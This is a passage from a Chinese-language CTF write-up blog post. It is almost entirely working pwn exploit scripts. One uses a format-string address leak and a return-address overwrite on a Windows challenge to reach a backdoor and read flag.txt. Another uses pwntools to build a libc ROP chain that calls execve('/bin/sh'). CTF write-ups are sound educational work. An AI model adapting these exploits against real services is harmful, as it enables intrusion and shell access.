</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>sock<span style=color:#ff79c6>.</span>sendall(payload)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span><span style=color:#8be9fd;font-style:italic>print</span>(sock<span style=color:#ff79c6>.</span>recv(<span style=color:#bd93f9>100</span>))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span><span style=color:#8be9fd;font-style:italic>print</span>(sock<span style=color:#ff79c6>.</span>recv(<span style=color:#bd93f9>100</span>))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span><span style=color:#8be9fd;font-style:italic>print</span>(sock<span style=color:#ff79c6>.</span>recv(<span style=color:#bd93f9>100</span>))
</span></span></code></pre></div><h3 id=0x02-windows>0x02 Windows</h3><p>主要是调用 <code>00402360</code> 处的后门</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#6272a4>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#ff79c6>import</span> socket  
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#ff79c6>import</span> time
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>      
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>pwn</span>():  
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>    s <span style=color:#ff79c6>=</span> socket<span style=color:#ff79c6>.</span>socket(socket<span style=color:#ff79c6>.</span>AF_INET, socket<span style=color:#ff79c6>.</span>SOCK_STREAM)  
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>    s<span style=color:#ff79c6>.</span>connect((<span style=color:#f1fa8c>&#34;your ip address&#34;</span>,<span style=color:#bd93f9>9990</span>))  
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>    time<span style=color:#ff79c6>.</span>sleep(<span style=color:#bd93f9>0.5</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>    <span style=color:#8be9fd;font-style:italic>print</span>(s<span style=color:#ff79c6>.</span>recv(<span style=color:#bd93f9>1024</span>))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>    <span style=color:#6272a4># 选择写入内容</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>    payload <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;1&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>    <span style=color:#6272a4># 向服务器发送数据  </span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>    s<span style=color:#ff79c6>.</span>sendall((payload <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>    time<span style=color:#ff79c6>.</span>sleep(<span style=color:#bd93f9>0.5</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>    <span style=color:#8be9fd;font-style:italic>print</span>(s<span style=color:#ff79c6>.</span>recv(<span style=color:#bd93f9>2048</span>))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>    <span style=color:#6272a4># 写入字符串%p</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>    payload <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;%p&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>    
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>    s<span style=color:#ff79c6>.</span>sendall((payload <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>    time<span style=color:#ff79c6>.</span>sleep(<span style=color:#bd93f9>0.5</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>    <span style=color:#8be9fd;font-style:italic>print</span>(s<span style=color:#ff79c6>.</span>recv(<span style=color:#bd93f9>1024</span>))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>    <span style=color:#6272a4># 读取地址%p</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>    payload <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;2&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>    s<span style=color:#ff79c6>.</span>sendall((payload <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span>    time<span style=color:#ff79c6>.</span>sleep(<span style=color:#bd93f9>0.5</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span>    <span style=color:#6272a4>#&#39;Here is your string:\r\n00D72230&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span>    r <span style=color:#ff79c6>=</span> s<span style=color:#ff79c6>.</span>recv(<span style=color:#bd93f9>1024</span>)<span style=color:#ff79c6>.</span>decode(<span style=color:#f1fa8c>&#39;gbk&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span>    <span style=color:#8be9fd;font-style:italic>print</span>(r)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span>    <span style=color:#6272a4># 选择写入</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span>    payload <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;1&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span>    s<span style=color:#ff79c6>.</span>sendall((payload <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span>    time<span style=color:#ff79c6>.</span>sleep(<span style=color:#bd93f9>0.5</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span>    
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span>    <span style=color:#8be9fd;font-style:italic>print</span>(s<span style=color:#ff79c6>.</span>recv(<span style=color:#bd93f9>1024</span>)<span style=color:#ff79c6>.</span>decode(<span style=color:#f1fa8c>&#39;gbk&#39;</span>))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37</span><span>    <span style=color:#6272a4># 写入Payload 覆盖返回值, 获取shell</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38</span><span>    payload <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;A&#39;</span><span style=color:#ff79c6>*</span><span style=color:#bd93f9>20</span><span style=color:#ff79c6>+</span>(<span style=color:#8be9fd;font-style:italic>int</span>(r[<span style=color:#ff79c6>-</span><span style=color:#bd93f9>8</span>:],base<span style=color:#ff79c6>=</span><span style=color:#bd93f9>16</span>)<span style=color:#ff79c6>+</span><span style=color:#bd93f9>176</span>)<span style=color:#ff79c6>.</span>to_bytes(<span style=color:#bd93f9>4</span>,<span style=color:#f1fa8c>&#39;little&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39</span><span>    s<span style=color:#ff79c6>.</span>sendall((payload <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40</span><span>    time<span style=color:#ff79c6>.</span>sleep(<span style=color:#bd93f9>0.5</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41</span><span>    <span style=color:#8be9fd;font-style:italic>print</span>(s<span style=color:#ff79c6>.</span>recv(<span style=color:#bd93f9>1024</span>)<span style=color:#ff79c6>.</span>decode(<span style=color:#f1fa8c>&#39;gbk&#39;</span>))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44</span><span>    payload <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;type flag.txt&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45</span><span>    s<span style=color:#ff79c6>.</span>sendall((payload <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46</span><span>    time<span style=color:#ff79c6>.</span>sleep(<span style=color:#bd93f9>0.5</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47</span><span>    <span style=color:#8be9fd;font-style:italic>print</span>(s<span style=color:#ff79c6>.</span>recv(<span style=color:#bd93f9>2048</span>)<span style=color:#ff79c6>.</span>decode(<span style=color:#f1fa8c>&#39;gbk&#39;</span>))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49</span><span>    s<span style=color:#ff79c6>.</span>close()
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52</span><span>pwn()
</span></span></code></pre></div><h3 id=0x03-upgrade>0x03 upgrade</h3><p>直接看脚本的注释或者看线下的解释吧&mldr;</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#6272a4>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#ff79c6>from</span> pwn <span style=color:#ff79c6>import</span> <span style=color:#ff79c6>*</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>p <span style=color:#ff79c6>=</span> process(<span style=color:#f1fa8c>&#34;./pwn2&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>p<span style=color:#ff79c6>.</span>send(<span style=color:#f1fa8c>&#39;1</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#8be9fd;font-style:italic>print</span>(p<span style=color:#ff79c6>.</span>recv())
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>p<span style=color:#ff79c6>.</span>send(<span style=color:#f1fa8c>&#39;15</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#6272a4>#print(p.recv())</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>t <span style=color:#ff79c6>=</span> p<span style=color:#ff79c6>.</span>recv()
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#8be9fd;font-style:italic>print</span>(t)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>libc_main_ret <span style=color:#ff79c6>=</span> [<span style=color:#8be9fd;font-style:italic>int</span>(s) <span style=color:#ff79c6>for</span> s <span style=color:#ff79c6>in</span> t<span style=color:#ff79c6>.</span>split() <span style=color:#ff79c6>if</span> s<span style=color:#ff79c6>.</span>isdigit()][<span style=color:#bd93f9>0</span>]
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#8be9fd;font-style:italic>print</span>(libc_main_ret)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>libc_main_base <span style=color:#ff79c6>=</span> libc_main_ret <span style=color:#ff79c6>-</span> <span style=color:#bd93f9>0x021B97</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>libc_pop_rdi <span style=color:#ff79c6>=</span> libc_main_base <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>0x02155f</span> 
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>libc_pop_rdx_rsi <span style=color:#ff79c6>=</span> libc_main_base <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>0x01306d9</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>libc_bin_sh <span style=color:#ff79c6>=</span> libc_main_base <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>0x01b3e9a</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>libc_int_80 <span style=color:#ff79c6>=</span> libc_main_base <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>0x01b3e9a</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>libc_execve <span style=color:#ff79c6>=</span>  libc_main_base <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>0xE4E30</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span><span style=color:#6272a4>#0x000000000002155f : pop rdi ; ret A</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span><span style=color:#6272a4>#0x0000000000023e6a : pop rsi ; ret B</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span><span style=color:#6272a4>#0x0000000000001b96 : pop rdx ; ret C</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span><span style=color:#6272a4>#0x000000000003eb0b : pop rcx ; ret D</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span><span style=color:#6272a4>#0x00000000001306d9 : pop rdx ; pop rsi ; ret</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span>p<span style=color:#ff79c6>.</span>send(<span style=color:#f1fa8c>&#39;2</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>15</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span>p<span style=color:#ff79c6>.</span>send(<span style=color:#8be9fd;font-style:italic>str</span>(libc_pop_rdi)<span style=color:#ff79c6>+</span><span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span><span style=color:#8be9fd;font-style:italic>print</span>(p<span style=color:#ff79c6>.</span>recv())
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span>p<span style=color:#ff79c6>.</span>send(<span style=color:#f1fa8c>&#39;2</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>16</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37</span><span>p<span style=color:#ff79c6>.</span>send(<span style=color:#8be9fd;font-style:italic>str</span>(libc_bin_sh)<span style=color:#ff79c6>+</span><span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38</span><span><span style=color:#8be9fd;font-style:italic>print</span>(p<span style=color:#ff79c6>.</span>recv())
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40</span><span>p<span style=color:#ff79c6>.</span>send(<span style=color:#f1fa8c>&#39;2</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>17</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41</span><span>p<span style=color:#ff79c6>.</span>send(<span style=color:#8be9fd;font-style:italic>str</span>(libc_pop_rdx_rsi)<span style=color:#ff79c6>+</span><span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42</span><span><span style=color:#8be9fd;font-style:italic>print</span>(p<span style=color:#ff79c6>.</span>recv())
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44</span><span>p<span style=color:#ff79c6>.</span>send(<span style=color:#f1fa8c>&#39;2</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>18</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45</span><span>p<span style=color:#ff79c6>.</span>send(<span style=color:#f1fa8c>&#39;0</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46</span><span><span style=color:#8be9fd;font-style:italic>print</span>(p<span style=color:#ff79c6>.</span>recv())
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48</span><span>p<span style=color:#ff79c6>.</span>send(<span style=color:#f1fa8c>&#39;2</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>19</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49</span><span>p<span style=color:#ff79c6>.</span>send(<span style=color:#f1fa8c>&#39;0</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50</span><span><span style=color:#8be9fd;font-style:italic>print</span>(p<span style=color:#ff79c6>.</span>recv())
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52</span><span>p<span style=color:#ff79c6>.</span>send(<span style=color:#f1fa8c>&#39;2</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>20</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53</span><span>p<span style=color:#ff79c6>.</span>send(<span style=color:#8be9fd;font-style:italic>str</span>(libc_execve)<span style=color:#ff79c6>+</span><span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54</span><span><span style=color:#8be9fd;font-style:italic>print</span>(p<span style=color:#ff79c6>.</span>recv())
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56</span><span>p<span style=color:#ff79c6>.</span>send(<span style=color:#f1fa8c>&#39;0</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">57</span><span><span style=color:#8be9fd;font-style:italic>print</span>(p<span style=color:#ff79c6>.</span>recv())
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">58</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">59</span><span>p<span style=color:#ff79c6>.</span>interactive()
</span></span></code></pre></div></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/c1ctf>c1ctf</a></li><li><a href=/tags/writeup>writeup</a></li></ul></nav></div></article></main><footer><div class=footer-info>© 2017 - 2022, rmb122</div><div style=display:flex><span class=border></span><a class=soc href=https://github.com/rmb122 title=GitHub><i data-feather=github></i></a><a class=soc href=https://rmb122.com/index.xml title=RSS><i data-feather=rss></i></a></div></footer><script>feather.replace()</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-1MH3QGWHV5"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-1MH3QGWHV5",{anonymize_ip:!1})}</script><script src=https://rmb122.com/js/medium-zoom.min.js></script>
<script>for(let e of document.getElementsByTagName("img"))mediumZoom(e,{margin:0,scrollOffset:40,container:null,template:null,background:"rgba(0, 0, 0, 0.8)"})</script></div></body></html>